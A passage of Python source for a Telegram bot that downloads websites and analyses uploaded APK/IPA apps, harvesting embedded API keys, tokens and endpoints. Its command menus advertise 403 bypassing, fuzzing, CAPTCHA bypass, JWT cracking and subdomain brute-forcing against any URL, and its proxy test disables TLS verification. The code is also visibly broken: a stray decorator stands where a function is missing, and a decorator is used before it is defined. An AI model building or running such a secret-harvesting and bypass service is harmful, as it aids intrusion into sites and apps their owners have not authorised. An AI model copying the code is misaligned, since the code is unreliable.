    if not doc:
        return

    uid   = update.effective_user.id
    uname = update.effective_user.first_name or "User"

    # ── Force join check ─────────────────────────
    if not await check_force_join(update, context):
        return

    # ── File type check ──────────────────────────
    fname    = doc.file_name or ""
    ext      = os.path.splitext(fname.lower())[1]
    fsize_mb = doc.file_size / 1024 / 1024 if doc.file_size else 0

    if ext not in _APP_EXTS:
        # Not an app file — ignore silently
        return

    # ── Size limit ───────────────────────────────
    if fsize_mb > APP_MAX_MB:
        await update.message.reply_text(
            f"⚠️ File ကြီးလွန်းတယ် (`{fsize_mb:.1f}MB`)\n"
            f"📏 Max: `{APP_MAX_MB}MB`",
            parse_mode='Markdown'
        )
        return

    # ── Rate limit ───────────────────────────────
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.message.reply_text(f"⏱️ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    file_type = _APP_EXTS.get(ext, ext.upper())
    msg = await update.message.reply_text(
        f"📱 *{file_type} Detected!*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📄 `{fname}`\n"
        f"💾 `{fsize_mb:.1f} MB`\n\n"
        f"⬇️ Downloading from Telegram...",
        parse_mode='Markdown'
    )

    # ── Download file from Telegram ──────────────
    work_dir  = os.path.join(APP_ANALYZE_DIR, str(uid))
    os.makedirs(work_dir, exist_ok=True)
    safe_name = re.sub(r'[^\w\.\-]', '_', fname)
    save_path = os.path.join(work_dir, safe_name)

    try:
        tg_file = await context.bot.get_file(doc.file_id)
        await tg_file.download_to_drive(save_path)
    except Exception as e:
        await msg.edit_text(f"❌ Download error: `{type(e).__name__}`", parse_mode='Markdown')
        return

    # ── Save path for /appassets command ─────────
    async with db_lock:
        db2 = _load_db_sync()
        u2  = get_user(db2, uid, uname)
        u2["last_uploaded_app"] = save_path
        _save_db_sync(db2)

    await msg.edit_text(
        f"📱 *{file_type} — `{fname}`*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ Downloaded `{fsize_mb:.1f}MB`\n\n"
        f"🔍 Phase 1: Text/Source scanning...\n"
        f"📦 Phase 2: Binary string extraction...\n"
        f"🔑 Phase 3: Secret/key detection...\n\n"
        f"⏳ Analyzing...",
        parse_mode='Markdown'
    )

    # ── Progress tracking ─────────────────────────
    prog_q = []
    async def _prog_loop():
        while True:
            await asyncio.sleep(3)
            if prog_q:
                txt = prog_q[-1]; prog_q.clear()
                try:
                    await msg.edit_text(
                        f"📱 *Analyzing `{fname}`*\n\n{txt}",
                        parse_mode='Markdown'
                    )
                except Exception:
                    pass

    prog_task = asyncio.create_task(_prog_loop())

    try:
        result = await asyncio.to_thread(
            analyze_app_file, save_path, lambda t: prog_q.append(t)
        )
    except Exception as e:
        prog_task.cancel()
        await msg.edit_text(f"❌ Analysis error: `{type(e).__name__}`\n`{str(e)[:100]}`",
                            parse_mode='Markdown')
        try: os.remove(save_path)
        except: pass
        return
    finally:
        prog_task.cancel()

    # ── Keep file for /appassets — remove previous file if any ──
    async with db_lock:
        db_pre = _load_db_sync()
        u_pre  = get_user(db_pre, uid, uname)
        old_path = u_pre.get("last_uploaded_app")
        if old_path and old_path != save_path:
            try: os.remove(old_path)
            except: pass

    # ══ Build result report ═══════════════════════
    app_info = result.get("app_info", {})
    urls     = result.get("urls", [])
    api_paths= result.get("api_paths", [])
    ws_urls  = result.get("ws_urls", [])
    secrets  = result.get("secrets", {})
    src_files= result.get("source_files", [])
    stats    = result.get("stats", {})
    errors   = result.get("errors", [])

    # ── Platform badge ────────────────────────────
    platform = app_info.get("platform", "")
    plat_icon = "🤖" if platform == "Android" else ("🍎" if platform == "iOS" else "📦")

    lines = [
        f"📱 *App Analysis — `{fname}`*",
        f"━━━━━━━━━━━━━━━━━━━━",
        f"{plat_icon} `{result['file_type']}` | 💾 `{result['file_size_mb']}MB`",
        f"📂 Files: `{stats.get('total_files',0)}` | Scanned: `{stats.get('text_files_scanned',0)}`",
        f"🌐 URLs: `{stats.get('unique_urls',0)}` | 🛤 API Paths: `{stats.get('api_paths',0)}`",
        f"🔌 WebSocket: `{stats.get('ws_urls',0)}` | 🔑 Secret types: `{stats.get('secret_types',0)}`",
        "",
    ]

    # App Info
    if app_info:
        lines.append(f"*{'🤖 Android' if platform == 'Android' else '🍎 iOS'} App Info:*")
        pkg = app_info.get("package") or app_info.get("bundle_id", "")
        if pkg:
            lines.append(f"  📦 `{pkg}`")
        perms = app_info.get("permissions", [])[:8]
        if perms:
            lines.append(f"  🔐 Permissions: `{', '.join(perms[:5])}`{'...' if len(perms)>5 else ''}")
        url_schemes = app_info.get("url_schemes", [])
        if url_schemes:
            lines.append(f"  🔗 URL Schemes: `{'`, `'.join(url_schemes[:4])}`")
        # Meta-data with potential API keys
        meta = app_info.get("meta_data", {})
        interesting_meta = {k: v for k, v in meta.items()
                           if any(kw in k.lower() for kw in
                                  ['api', 'key', 'secret', 'token', 'firebase',
                                   'google', 'facebook', 'stripe', 'url', 'host'])}
        if interesting_meta:
            lines.append(f"  🗝 Meta-data keys ({len(interesting_meta)}):")
            for k, v in list(interesting_meta.items())[:5]:
                lines.append(f"     • `{k}` = `{v[:40]}`")
        # iOS plist keys
        plist_keys = app_info.get("keys", {})
        if plist_keys:
            lines.append(f"  🗝 Config keys ({len(plist_keys)}):")
            for k, v in list(plist_keys.items())[:5]:
                lines.append(f"     • `{k}` = `{v[:40]}`")
        lines.append("")

    # Secrets found
    if secrets:
        lines.append(f"*🔑 Potential Secrets Found ({len(secrets)} types):*")
        for name, count in sorted(secrets.items(), key=lambda x: -x[1]):
            risk = "🔴" if name in ('AWS Key', 'AWS Secret', 'Private Key', 'Stripe Key',
                                     'Hardcoded Pass', 'JWT Token') else "🟡"
            lines.append(f"  {risk} `{name}` × {count}")
        lines.append("")

    # API paths
    if api_paths:
        lines.append(f"*🛤 API Paths ({len(api_paths)}):*")
        for p in api_paths[:15]:
            lines.append(f"  🟢 `{p}`")
        if len(api_paths) > 15:
            lines.append(f"  _...and {len(api_paths)-15} more in JSON report_")
        lines.append("")

    # Full URLs (top domains)
    if urls:
        # Group by domain
        domain_map = {}
        for u in urls:
            try:
                d = urlparse(u).netloc
                domain_map.setdefault(d, []).append(u)
            except Exception:
                pass
        lines.append(f"*🌐 Hosts Found ({len(domain_map)} unique):*")
        for domain, durls in sorted(domain_map.items(), key=lambda x: -len(x[1]))[:10]:
            lines.append(f"  🔵 `{domain}` ({len(durls)} URLs)")
        lines.append("")

    # WebSocket
    if ws_urls:
        lines.append(f"*🔌 WebSocket URLs ({len(ws_urls)}):*")
        for w in ws_urls[:5]:
            lines.append(f"  🟣 `{w[:80]}`")
        lines.append("")

    # Top source files
    if src_files:
        lines.append(f"*📄 Hot Source Files ({len(src_files)}):*")
        for sf in src_files[:8]:
            fname_short = sf["file"].split("/")[-1]
            tags = []
            if sf["urls"] > 0:   tags.append(f"{sf['urls']} URLs")
            if sf["secrets"]:    tags.append(f"🔑 {','.join(sf['secrets'][:2])}")
            lines.append(f"  📝 `{fname_short}` — {' | '.join(tags)}")
        lines.append("")

    if errors:
        lines.append(f"⚠️ _Errors: {len(errors)}_")

    lines.append("⚠️ _Passive analysis only — no exploitation_")

    report_text = "\n".join(lines)

    # ── Send text report ──────────────────────────
    try:
        if len(report_text) <= 4000:
            await msg.edit_text(report_text, parse_mode='Markdown')
        else:
            await msg.edit_text(report_text[:4000], parse_mode='Markdown')
            await update.message.reply_text(report_text[4000:8000], parse_mode='Markdown')
    except Exception:
        await update.message.reply_text(report_text[:4000], parse_mode='Markdown')

    # ── Export full JSON report ───────────────────
    try:
        safe_fname = re.sub(r'[^\w\-]', '_', os.path.splitext(fname)[0])
        ts         = datetime.now().strftime("%Y%m%d_%H%M%S")
        json_path  = os.path.join(APP_ANALYZE_DIR, f"app_{safe_fname}_{ts}.json")

        export = {
            "filename":    fname,
            "file_type":   result["file_type"],
            "file_size_mb":result["file_size_mb"],
            "analyzed_at": datetime.now().isoformat(),
            "app_info":    app_info,
            "stats":       stats,
            "api_paths":   api_paths,
            "urls":        urls,
            "ws_urls":     ws_urls,
            "secrets_found": {k: f"×{v}" for k, v in secrets.items()},
            "source_files":  src_files,
            "errors":        errors[:20],
        }
        with open(json_path, 'w', encoding='utf-8') as jf:
            json.dump(export, jf, ensure_ascii=False, indent=2)

        cap = (
            f"📦 *App Analysis Report*\n"
            f"📱 `{fname}`\n"
            f"🌐 `{stats.get('unique_urls',0)}` URLs | "
            f"🛤 `{stats.get('api_paths',0)}` API paths | "
            f"🔑 `{stats.get('secret_types',0)}` secret types"
        )
        with open(json_path, 'rb') as jf:
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=jf,
                filename=f"app_{safe_fname}_{ts}.json",
                caption=cap,
                parse_mode='Markdown'
            )
        os.remove(json_path)

    except Exception as e:
        logger.warning("App JSON export error: %s", e)



async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid   = update.effective_user.id
    uname = update.effective_user.first_name or "User"
    async with db_lock:
        db2 = _load_db_sync()
        get_user(db2, uid, uname)
        _save_db_sync(db2)

    js_status   = "✅ JS Ready" if PUPPETEER_OK else "⚠️ JS Off"
    adm_line     = "\n\n🔧 *Admin Panel:* /admin" if uid in ADMIN_IDS else ""

    await update.effective_message.reply_text(
        f"👋 *မင်္ဂလာပါ, {uname}!*\n"
        f"🌐 *Website Downloader Bot v17.0*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📥 *Download Commands:*\n"
        f"  `/download <url>` — Single page\n"
        f"  `/fullsite <url>` — Full website\n"
        f"  `/jsdownload <url>` — JS/React site _{js_status}_\n"
        f"  `/resume <url>` — Download ဆက်လုပ်ရန်\n"
        f"  `/stop` — Download ရပ်ရန်\n\n"
        f"🔍 *Tools:*\n"
        f"  `/vuln <url>` — Security scan\n"
        f"  `/api <url>` — API discovery\n"
        f"  `/tech <url>` — Tech stack fingerprint\n"
        f"  `/extract <url>` — Secret/key scanner\n"
        f"  `/subdomains <domain>` — Subdomain enumeration\n"
        f"  `/bypass403 <url>` — 403 bypass tester\n"
        f"  `/fuzz <url>` — Path & param fuzzer\n"
        f"  `/monitor` — Change alert monitor\n"
        f"  `/smartfuzz <url>` — 🗂️ Context-aware smart fuzzer\n"
        f"  `/antibot <url>` — 🤖 Anti-bot / Captcha bypass\n"
        f"  `/jwtattack <token>` — 🎟️ JWT decode & crack\n"
        f"  `/sitekey <url>` — 🔑 reCAPTCHA/hCaptcha/Turnstile key extractor\n\n"
        f"📱 *App Analyzer:*\n"
        f"  APK / IPA / ZIP / JAR upload လုပ်ပါ\n"
        f"  → Auto API + Secret extraction\n\n"
        f"📊 *Account:*\n"
        f"  `/status` — Usage ကြည့်ရန်\n"
        f"  `/history` — Download history\n"
        f"  `/mystats` — Detailed stats\n\n"
        f"🔒 SSRF Protected{adm_line}\n\n"
        f"❓ /help — Commands အကူအညီ",
        parse_mode='Markdown'
    )


async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid     = update.effective_user.id
    is_adm  = uid in ADMIN_IDS
    js_st    = "✅ Ready" if PUPPETEER_OK else "❌ `npm install puppeteer`"
    base = (
        "📖 *Commands Guide — v17.0*\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"

        "📥 *Website Download*\n"
        "  `/download <url>`\n"
        "   └ Single page HTML + assets\n\n"
        "  `/fullsite <url>`\n"
        "   └ Website အပြည့် (sitemap scan ပါ)\n\n"
        "  `/jsdownload <url>`\n"
        "   └ React/Vue/Angular JS sites\n"
        "   └ Status: " + js_st + "\n\n"
        "  `/jsfullsite <url>`\n"
        "   └ JS + Full crawl ပေါင်းစပ်\n\n"
        "  `/resume <url>`\n"
        "   └ ကျသွားလျှင် ဆက်လုပ်ရန်\n\n"

        "📱 *App Analyzer (Upload File):*\n"
        "  APK / IPA / ZIP / JAR / AAB / JAR\n"
        "   └ Chat ထဲ file drop ရုံသာ\n"
        "   └ API endpoints + Secrets + Hosts\n"
        "   └ AndroidManifest / Info.plist parse\n"
        "   └ JSON report auto-export\n"
        f"   └ Max size: `{APP_MAX_MB}MB`\n\n"
        "🔍 *Scan & Discovery*\n"
        "  `/vuln <url>` — Security vulnerability scan\n"
        "  `/api <url>` — API endpoint discovery\n"
        "  `/tech <url>` — Tech stack fingerprinter\n"
        "  `/extract <url>` — Secret/API key scanner (JS bundles)\n\n"
        "🔓 *Advanced Recon*\n"
        "  `/subdomains <domain>` — Subdomain enum (crt.sh + brute-force)\n"
        "  `/bypass403 <url>` — 403 bypass (50+ techniques)\n"
        "  `/fuzz <url> [paths|params]` — HTTP path & param fuzzer\n\n"
        "🔔 *Monitoring*\n"
        "  `/monitor add <url> [min] [label]` — Alert on page change\n"
        "  `/monitor list|del|clear` — Manage monitors\n\n"

        "📊 *My Account*\n"
        "  `/status` — Daily limit + usage\n"
        "  `/history` — Download log (last 10)\n"
        "  `/mystats` — Total stats\n\n"

        "💡 *Tips:*\n"
        "  • 50MB+ ဆိုရင် auto split လုပ်ပြီး ပို့ပေးမယ်\n"
        "  • JS site error ဖြစ်ရင် `/jsdownload` သုံးပါ\n"
        "  • Download ကျရင် `/resume` နဲ့ ဆက်နိုင်တယ်\n"
        "  • 🔒 SSRF + Path traversal protected"
    )

    admin_section = (
        "\n\n👑 *Admin Commands:*\n"
        "  `/admin` — Admin panel\n"
        "  `/ban` `/unban` `/setlimit` `/userinfo`\n"
        "  `/broadcast` `/allusers` `/setpages` `/setassets`\n\n"
            )

    await update.effective_message.reply_text(
        base + (admin_section if is_adm else ""),
        parse_mode='Markdown'
    )

async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    async with db_lock:
        db = _load_db_sync()
        u  = get_user(db, update.effective_user.id, update.effective_user.first_name)
        reset_daily(u)
        _save_db_sync(db)
    lim  = get_limit(db, u)
    used = u["count_today"]
    bar  = pbar(used, lim if lim > 0 else max(used, 1))
    await update.effective_message.reply_text(
        f"📊 *Status*\n\n👤 {u['name']}\n"
        f"🚫 Banned: {'Yes ❌' if u['banned'] else 'No ✅'}\n\n"
        f"📅 Today:\n`{bar}`\n"
        f"Used: `{used}` / `{'∞' if lim==0 else lim}`\n"
        f"📦 Total: `{u['total_downloads']}`",
        parse_mode='Markdown'
    )

async def cmd_history(update: Update, context: ContextTypes.DEFAULT_TYPE):
    async with db_lock:
        db = _load_db_sync()
        u  = get_user(db, update.effective_user.id)
    dls = u.get("downloads",[])[-10:]
    if not dls:
        await update.effective_message.reply_text("📭 History မရှိသေးပါ"); return
    lines = ["📜 *Download History*\n"]
    for d in reversed(dls):
        icon = {"success":"✅","too_large":"⚠️"}.get(d["status"],"❌")
        lines.append(f"{icon} `{d['url'][:45]}`\n   {d['time']} | {d['size_mb']}MB")
    await update.effective_message.reply_text("\n".join(lines), parse_mode='Markdown')


# ── Core download runner ──────────────────────────

async def _run_download(
    update: Update, context: ContextTypes.DEFAULT_TYPE,
    url: str, full_site: bool, use_js: bool,
    resume_mode: bool = False
):
    uid   = update.effective_user.id
    uname = update.effective_user.first_name

    # ── Rate limit check ──────────────────────────
    if not resume_mode:
        allowed, wait_sec = check_rate_limit(uid)
        if not allowed:
            await update.effective_message.reply_text(
                f"⏱️ နည်းနည်းစောင့်ပါ — `{wait_sec}` seconds ကျန်သေးတယ်",
                parse_mode='Markdown'
            )
            return

    # ── SSRF pre-check ────────────────────────────
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(
            f"🚫 URL ကို download လုပ်ခွင့်မပြုပါ\n`{reason}`",
            parse_mode='Markdown'
        )
        return

    # ── DB checks (with lock) ─────────────────────
    async with db_lock:
        db = _load_db_sync()
        u  = get_user(db, uid, uname)
        reset_daily(u)

        if u["banned"]:
            _save_db_sync(db)
            await update.effective_message.reply_text("🚫 Ban ထားပါတယ်"); return
        if not db["settings"]["bot_enabled"] and uid not in ADMIN_IDS:
            _save_db_sync(db)
            await update.effective_message.reply_text("🔴 Bot ယာယီပိတ်ထားပါတယ်"); return
        if not resume_mode and not can_download(db, u):
            lim = get_limit(db, u)
            _save_db_sync(db)
            await update.effective_message.reply_text(f"⛔ Daily limit ({lim}) ပြည့်ပါပြီ"); return
        _save_db_sync(db)

    mode_txt = ("🌐 Full" if full_site else "📄 Single") + (" ⚡JS" if use_js else "")
    msg = await update.effective_message.reply_text(
        f"⏳ *Download စနေပါတယ်{'(Resume)' if resume_mode else ''}...*\n"
        f"🔗 `{sanitize_log_url(url)}`\n📋 {mode_txt}\n\n"
        f"`{'░'*18}`  0%",
        parse_mode='Markdown'
    )

    last = {'t': ''}
    def sync_cb(text): last['t'] = text

    # ── Cancel flag — /stop command ───────────────
    cancel_event = asyncio.Event()
    _cancel_flags[uid] = cancel_event

    async def progress_loop():
        while True:
            await asyncio.sleep(2.5)
            if cancel_event.is_set():
                return
            if last['t']:
                try:
                    await msg.edit_text(
                        f"⏳ *Download နေဆဲ...*\n🔗 `{sanitize_log_url(url)}`\n\n{last['t']}",
                        parse_mode='Markdown'
                    )
                except RetryAfter as e:
                    await asyncio.sleep(e.retry_after + 1)
                except BadRequest:
                    pass

    prog = asyncio.create_task(progress_loop())

    async with download_semaphore:
        # Check cancel before starting heavy work
        if cancel_event.is_set():
            prog.cancel()
            _cancel_flags.pop(uid, None)
            await msg.edit_text("🛑 Download cancelled")
            return
        try:
            async with db_lock:
                db2 = _load_db_sync()
            mp = db2["settings"]["max_pages"]
            ma = db2["settings"]["max_assets"]
            files, error, stats, size_mb = await asyncio.to_thread(
                download_website, url, full_site, use_js, mp, ma, sync_cb, resume_mode
            )
        except Exception as e:
            prog.cancel()
            err_name = type(e).__name__
            err_hint = {
                "ConnectionError":  "🌐 ဆာဗာနဲ့ ချိတ်ဆက်မရပါ",
                "TimeoutError":     "⏱️ Response timeout ဖြစ်သွားတယ်",
                "SSLError":         "🔒 SSL certificate ပြဿနာ",
                "TooManyRedirects": "🔄 Redirect loop ဖြစ်နေတယ်",
            }.get(err_name, f"⚠️ {err_name}")
            await msg.edit_text(
                f"❌ *Download မအောင်မြင်ဘူး*\n\n"
                f"{err_hint}\n\n"
                f"▸ ဆက်လုပ်ဖို့: `/resume {url}`\n"
                f"▸ JS site ဆိုရင်: `/jsdownload {url}`",
                parse_mode='Markdown'
            )
            async with db_lock:
                db3 = _load_db_sync()
                u3  = get_user(db3, uid)
                log_download(u3, url, 0, "error")
                _save_db_sync(db3)
            _cancel_flags.pop(uid, None)
            return

    prog.cancel()
    _cancel_flags.pop(uid, None)   # download finished — remove flag

    # Check if cancelled during download
    if cancel_event.is_set():
        await msg.edit_text("🛑 Download ကို cancel လုပ်ပြီးပါပြီ")
        return

    if error:
        await msg.edit_text(f"❌ {error}"); return

    is_split = len(files) > 1
    await msg.edit_text(
        f"📤 Upload နေပါတယ်...\n💾 {size_mb:.1f} MB"
        + (f" → {len(files)} parts" if is_split else ""),
        parse_mode='Markdown'
    )

    try:
        for i, fpath in enumerate(files):
            part_label = f" (Part {i+1}/{len(files)})" if is_split else ""
            cap = (
                f"{'✅' if i==len(files)-1 else '📦'} *Done{part_label}*\n"
                f"🔗 `{sanitize_log_url(url)}`\n"
                f"📄 {stats['pages']}p | 📦 {stats['assets']}a | 💾 {size_mb:.1f}MB"
            )
            # ── RetryAfter-aware upload (3 attempts) ──────
            for attempt in range(3):
                try:
                    with open(fpath, 'rb') as f:
                        await context.bot.send_document(
                            chat_id=update.effective_chat.id,
                            document=f, filename=os.path.basename(fpath),
                            caption=cap, parse_mode='Markdown'
                        )
                    break  # success
                except RetryAfter as e:
                    wait = e.retry_after + 2
                    logger.warning("Upload RetryAfter: waiting %ds", wait)
                    await asyncio.sleep(wait)
                except Exception:
                    if attempt == 2:
                        raise
                    await asyncio.sleep(3)

            os.remove(fpath)
            await asyncio.sleep(1)

        join_hint = (
            "\n\n*Combine လုပ်နည်း:*\n```\ncat *.part*.zip > full.zip\n```"
        ) if is_split else ""

        await msg.edit_text(f"✅ ပြီးပါပြီ 🎉{join_hint}", parse_mode='Markdown')

        async with db_lock:
            db4 = _load_db_sync()
            u4  = get_user(db4, uid)
            log_download(u4, url, size_mb, "success")
            _save_db_sync(db4)

    except RetryAfter as e:
        await msg.edit_text(f"❌ Telegram flood limit — `{e.retry_after}s` နောက်မှ ထပ်ကြိုးစားပါ")
    except Exception as e:
        await msg.edit_text(f"❌ Upload error: {type(e).__name__}")


# ── Command wrappers ──────────────────────────────

async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/stop — Cancel current running download"""
    uid = update.effective_user.id
    event = _cancel_flags.get(uid)
    if event and not event.is_set():
        event.set()
        await update.effective_message.reply_text(
            "🛑 *Download cancel လုပ်နေပါတယ်...*\n"
            "⚙️ လက်ရှိ page/asset ပြီးရင် ရပ်မယ်",
            parse_mode='Markdown'
        )
    else:
        await update.effective_message.reply_text(
            "ℹ️ Cancel လုပ်စရာ Download မရှိပါ\n"
            "`/download`, `/fullsite` စသည်ဖြင့် download ကနဦးစပါ",
            parse_mode='Markdown'
        )


async def cmd_download(u, c):
    if not await check_force_join(u, c): return
    if not c.args: return await u.message.reply_text("Usage: `/download <url>`", parse_mode='Markdown')
    url = c.args[0] if c.args[0].startswith('http') else 'https://'+c.args[0]
    await enqueue_download(u, c, url, False, False)

async def cmd_fullsite(u, c):
    if not await check_force_join(u, c): return
    if not c.args: return await u.message.reply_text("Usage: `/fullsite <url>`", parse_mode='Markdown')
    url = c.args[0] if c.args[0].startswith('http') else 'https://'+c.args[0]
    await enqueue_download(u, c, url, True, False)

async def cmd_jsdownload(u, c):
    if not await check_force_join(u, c): return
    if not c.args: return await u.message.reply_text("Usage: `/jsdownload <url>`", parse_mode='Markdown')
    url = c.args[0] if c.args[0].startswith('http') else 'https://'+c.args[0]
    await enqueue_download(u, c, url, False, True)

async def cmd_jsfullsite(u, c):
    if not await check_force_join(u, c): return
    if not c.args: return await u.message.reply_text("Usage: `/jsfullsite <url>`", parse_mode='Markdown')
    url = c.args[0] if c.args[0].startswith('http') else 'https://'+c.args[0]
    await enqueue_download(u, c, url, True, True)

async def cmd_resume(u, c):
    if not await check_force_join(u, c): return
    if not c.args: return await u.message.reply_text("Usage: `/resume <url>`", parse_mode='Markdown')
    url   = c.args[0] if c.args[0].startswith('http') else 'https://'+c.args[0]
    state = load_resume(url)
    if not state["visited"] and not state["downloaded"]:
        await u.message.reply_text("⚠️ Resume state မတွေ့ပါ — `/download` ကနေ အသစ်ကနေ စပါ", parse_mode='Markdown')
        return
    await u.message.reply_text(
        f"♻️ Resume: `{len(state['visited'])}` pages, `{len(state['downloaded'])}` assets done",
        parse_mode='Markdown'
    )
    await enqueue_download(u, c, url, True, False, resume_mode=True)


# ══════════════════════════════════════════════════
# 👑  ADMIN COMMANDS
# ══════════════════════════════════════════════════

async def _send_admin_panel(target, db: dict):
    bot_on    = db["settings"]["bot_enabled"]
    today     = str(date.today())
    tu        = len(db["users"])
    tdl       = sum(u.get("total_downloads",0) for u in db["users"].values())
    banned_n  = sum(1 for u in db["users"].values() if u.get("banned"))
    today_dl  = sum(u["count_today"] for u in db["users"].values() if u.get("last_date")==today)
    kb = [
        [
            InlineKeyboardButton("👥 Users",   callback_data="adm_users"),
            InlineKeyboardButton("📊 Stats",   callback_data="adm_stats"),
        ],
        [
            InlineKeyboardButton("⚙️ Settings", callback_data="adm_settings"),
            InlineKeyboardButton(
                "🔴 Bot OFF" if bot_on else "🟢 Bot ON",
                callback_data="adm_toggle_bot"
            ),
        ],
        [InlineKeyboardButton("📜 Downloads Log", callback_data="adm_log")]
    ]
    text = (
        f"👑 *Admin Panel v17.0*\n\n"
        f"👥 Users: `{tu}` | 🚫 Banned: `{banned_n}`\n"
        f"📦 Total: `{tdl}` | Today: `{today_dl}`\n"
        f"Bot: {'🟢 ON' if bot_on else '🔴 OFF'}\n"
        f"⚡ Concurrent: `{MAX_WORKERS}` | Limit: `{db['settings']['global_daily_limit']}`\n"
        f"🔒 SSRF/Traversal/RateLimit: ✅\n"
        f"JS: {'✅' if PUPPETEER_OK else '❌'}"
    )
    markup = InlineKeyboardMarkup(kb)
    try:
        if hasattr(target, 'edit_message_text'):
            await target.edit_message_text(text, reply_markup=markup, parse_mode='Markdown')
        else:
            await target.reply_text(text, reply_markup=markup, parse_mode='Markdown')
    except BadRequest: pass

@admin_only

# ══════════════════════════════════════════════════
# 🌐  PROXY ADMIN COMMANDS
# ══════════════════════════════════════════════════

@admin_only
async def cmd_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show proxy status and manage proxy list."""
    st = proxy_manager.stats()
    enabled_icon = "🟢" if st["enabled"] else "🔴"
    en = "ENABLED" if st["enabled"] else "DISABLED"
    text = (
        "🌐 *Proxy Manager*\n"
        "━"*20 + "\n"
        f"{enabled_icon} Status    : `{en}`\n"
        f"📋 Total     : `{st['total']}`\n"
        f"✅ Live      : `{st['live']}`\n"
        f"⏳ Cooldown  : `{st['in_cooldown']}`\n"
        f"🚀 Available : `{st['available']}`\n"
        f"🕐 Last Load : `{st['last_load']}`\n"
        f"📁 Source    : `{st['source'][:60]}`\n\n"
        "*Commands:*\n"
        "`/proxy reload` — Reload & recheck all proxies\n"
        "`/proxy add <proxy>` — Add single proxy\n"
        "`/proxy list` — List all proxies with status\n"
        "`/proxy test <url>` — Test current proxy against URL\n"
    )

    if context.args:
        sub = context.args[0].lower()

        if sub == "reload":
            await update.effective_message.reply_text("🔄 Reloading proxy list...", parse_mode='Markdown')
            await asyncio.to_thread(proxy_manager.reload)
            st2 = proxy_manager.stats()
            await update.effective_message.reply_text(
                "✅ *Proxy list reloaded*\n"
                f"Live: `{st2['live']}/{st2['total']}`",
                parse_mode='Markdown'
            )
            return

        elif sub == "add" and len(context.args) >= 2:
            proxy_url = context.args[1].strip()
            proxy_manager.add_proxy(proxy_url)
            await update.effective_message.reply_text(
                f"✅ Added proxy (health-checking in background):\n`{proxy_url}`",
                parse_mode='Markdown'
            )
            return

        elif sub == "list":
            proxies = proxy_manager.list_proxies()
            if not proxies:
                await update.effective_message.reply_text("📭 No proxies loaded.", parse_mode='Markdown')
                return
            lines_out = ["🌐 *Proxy List*\n" + "━"*14]
            for i, p in enumerate(proxies[:30], 1):
                icon = "✅" if p["alive"] and not p["cooldown"] else ("⏳" if p["cooldown"] else "❌")
                lines_out.append(f"{icon} `{p['proxy']}`")
            if len(proxies) > 30:
                lines_out.append(f"_...and {len(proxies)-30} more_")
            await update.effective_message.reply_text("\n".join(lines_out), parse_mode='Markdown')
            return

        elif sub == "test":
            test_url = context.args[1] if len(context.args) > 1 else "https://httpbin.org/ip"
            px = proxy_manager.get_proxy()
            if not px:
                await update.effective_message.reply_text("❌ No proxy available", parse_mode='Markdown')
                return
            proxy_url = px.get("http", "")
            try:
                resp = await asyncio.to_thread(
                    lambda: requests.get(test_url, proxies=px, timeout=10, verify=False)
                )
                await update.effective_message.reply_text(
                    "✅ *Proxy test passed*\n"
                    f"Proxy  : `{proxy_url}`\n"
                    f"URL    : `{test_url}`\n"
                    f"Status : `{resp.status_code}`\n"
                    f"Body   : `{resp.text[:100]}`",
                    parse_mode='Markdown'
                )
            except Exception as e:
                proxy_manager.mark_failed(px)
                await update.effective_message.reply_text(
                    "❌ *Proxy test failed*\n"
                    f"Proxy: `{proxy_url}`\n"
                    f"Error: `{e}`",
                    parse_mode='Markdown'
                )
            return

    await update.effective_message.reply_text(text, parse_mode='Markdown')


@admin_only
async def cmd_setproxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set GitHub raw URL or direct URL as proxy source and reload."""
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:*\n"
            "`/setproxy https://raw.githubusercontent.com/.../proxies.txt`\n\n"
            "Bot သည့သည် ဒီ URL ကနေသ proxy list ဆဲပြီး health-check လုပ်မည့",
            parse_mode='Markdown'
        )
        return
    new_url = context.args[0].strip()
    global PROXY_FILE_URL
    PROXY_FILE_URL = new_url
    await update.effective_message.reply_text(
        f"✅ Proxy source set to:\n`{new_url}`\n\nReloading...",
        parse_mode='Markdown'
    )
    await asyncio.to_thread(proxy_manager.reload)
    st = proxy_manager.stats()
    await update.effective_message.reply_text(
        f"✅ Loaded `{st['live']}/{st['total']}` live proxies",
        parse_mode='Markdown'
    )


# ══════════════════════════════════════════════════
# 🔒  SECURITY LAYER 5 — Admin Auth Hardened
# ══════════════════════════════════════════════════

async def verify_admin(update: Update) -> bool:
    """
    Admin verification — multi-layer check
    """
    uid = update.effective_user.id

    # Layer 1: ID check
    if uid not in ADMIN_IDS:
        return False

    # Layer 2: Private chat only (admin commands in group = dangerous)
    if update.effective_chat.type != "private":
        await update.effective_message.reply_text(
            "⚠️ Admin commands ကို private chat မှာသာ သုံးနိုင်ပါတယ်"
        )
        return False

    # Layer 3: Not a forwarded message (anti-spoofing)
    # forward_origin = newer PTB | forward_date = older PTB version
    if update.message:
        is_forwarded = (
            getattr(update.message, 'forward_origin', None) or
            getattr(update.message, 'forward_date', None)
        )
        if is_forwarded:
            return False

    return True

def admin_only(func):
    @functools.wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not await verify_admin(update):
            # ── Admin command — user မြင်ရင်မကောင်းဘူး — silent ignore ──
            return
        return await func(update, context)
    return wrapper


# ══════════════════════════════════════════════════
# 🚨  ADMIN ERROR NOTIFY — Unhandled error → Admin DM
# ══════════════════════════════════════════════════

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Global error handler — Admin ဆီ Telegram message ပို့မည်"""
    import traceback
    tb = "".join(traceback.format_exception(
        type(context.error), context.error, context.error.__traceback__
    ))
